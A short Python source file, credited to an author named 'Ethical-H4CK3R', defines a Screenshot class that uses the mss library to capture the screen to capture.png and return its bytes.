# Date: 10/12/2017
# Author: Ethical-H4CK3R
# Description: Screenshot

from mss import mss 

class Screenshot(object):
 def __init__(self):
  self.img = 'capture.png'
  
 def capture(self):
  try:
   with mss() as sct:
    sct.shot(output=self.img)
    return self.convert()
  except:pass  
  
 def convert(self):
  with open(self.img, 'rb') as data: 
   try:return data.read()
   except:pass   